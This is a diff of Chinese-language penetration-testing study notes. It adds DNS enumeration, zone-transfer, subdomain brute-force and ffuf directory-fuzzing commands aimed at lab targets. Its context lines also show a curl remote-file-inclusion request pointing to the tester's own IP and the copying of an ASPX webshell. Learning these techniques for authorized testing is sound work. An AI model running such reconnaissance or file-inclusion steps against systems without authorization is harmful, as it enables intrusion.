@@ -17,7 +17,39 @@ date: 2024-02-07
   - nmap: `$ nmap <url>`
 - 封包 headers 和 contents: Wireshark、Browser、BurpSuite
 - cookies
-- Enum directory/dns
+
+### Enum directory/dns
+
+- DNS Enumeration (OSCP 常考): 標準記錄列舉：查 A、AAAA、MX、NS、SOA、TXT 等記錄
+
+  ```bash
+  $ dnsrecon -d <domain> -t std # std 代表 standard type scan
+  $ dnsenum <domain>
+  $ whois -h <whois server> <domain name> # -h 是指定要問哪台 WHOIS server。不加的話會去查公開的 WHOIS server，結果可能會不一樣
+
+  # nslookup 就是手動查 DNS 記錄的工具，你給它域名，它回你 IP，反過來也行。
+  $ nslookup megacorpone.com              # 查 A 記錄（域名→IP）
+  $ nslookup 149.56.244.87                # 反查（IP→域名）
+  $ nslookup -type=MX megacorpone.com     # 指定查 MX 記錄
+  $ nslookup -type=TXT megacorpone.com    # 查 TXT 記錄
+
+  # Zone Transfer
+  $ dnsrecon -d <domain> -t axfr
+  $ dig axfr @<ns> <domain> # e.g. dig axfr megacorpone.com @ns1.megacorpone.com
+
+  # 子網域暴力破解
+  $ dnsrecon -d <domain> -t brt -D wordlist.txt
+  ```
+
+  - [Whois](https://www.whois.com/whois) or [ipwhoisinfo](https://ipwhoisinfo.com/)
+  - [DNS Lookup(從 Domain Name 看 IP)](https://www.whatismyip.com/dns-lookup/)
+
+- ffuf
+  ```bash
+  $ ffuf -u https://kobold.htb -H "Host: FUZZ.kobold.htb" -w /snap/seclists/1214/Discovery/DNS/subdomains-top1million-20000.txt -k -fs <filter size> # for subdomain
+  $ ffuf -u https://mcp.kobold.htb/FUZZ -w /snap/seclists/1214//Discovery/Web-Content/common.txt -k # for directory
+  $ ffuf -u http://192.168.198.48/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt # 會著重在特定的檔案類型
+  ```
 
 ### Information Leak
 
@@ -552,11 +584,11 @@ $ curl -k "http://<victim server IP>/meteor/index.php?page=http://<自己的 IP>
   - [ysoserial.net](https://github.com/pwntester/ysoserial.net)
 
 | 語言   | 序列化         | 反序列化       | Magic Method                             |
-| ------ | -------------- | -------------- | ---------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| ------ | -------------- | -------------- | ---------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | Python | pickle.dumps() | pickle.loads() | `__reduce`                               |
 | PHP    | serialize      |                | unserialize                              | `__destruct()`: Object 被銷毀或 garbage collection 會觸發<br>`__wakeup()`: unserialize 時自動觸發<br>`__call()`: 如果被呼叫一個不存在的方法就會嘗試呼叫，`$obj->note_exist();`<br>`__toString()`: 在被當成 String 處理時呼叫，`echo $obj;`<br> |
 | Java   |                |                | `toString`<br>`readObject`<br>`finalize` |
-| .NET   |                |                | ViewState & Session 會存放序列化資料      |
+| .NET   |                |                | ViewState & Session 會存放序列化資料     |
 
 ### Frontend
 
@@ -738,8 +770,8 @@ $ cp /usr/share/webshells/aspx/cmdasp.aspx . # 也可以直接用現成的 websh
 
 | Fuck                                                                    | Beautifier                                                                                |
 | ----------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- | -------------------------------- |
-| [jsfuck](http://www.jsfuck.com/)<br>[JS 混淆器](https://obfuscator.io/) | 把 JS 的程式變成可讀性很差的東西                                                            | [JSNice](http://www.jsnice.org/) |
-| [jjencode](https://utf-8.jp/public/jjencode.html)                       | [JS 反混淆器](https://beautifier.io/): 可以反混淆或解密 JS 的檔案                           |
+| [jsfuck](http://www.jsfuck.com/)<br>[JS 混淆器](https://obfuscator.io/) | 把 JS 的程式變成可讀性很差的東西                                                          | [JSNice](http://www.jsnice.org/) |
+| [jjencode](https://utf-8.jp/public/jjencode.html)                       | [JS 反混淆器](https://beautifier.io/): 可以反混淆或解密 JS 的檔案                         |
 | [aaencode](https://utf-8.jp/public/aaencode.html)                       | [JS 壓縮+加密+混淆+美化](https://js.wfuapp.com/)                                          |
 | [Esolang List](https://esolangs.org/wiki/Language_list)                 | [JS Fuck Decode](https://www.53lu.com/tool/jsfuckdecode/)                                 |
 |                                                                         | [aadecode](https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html) |
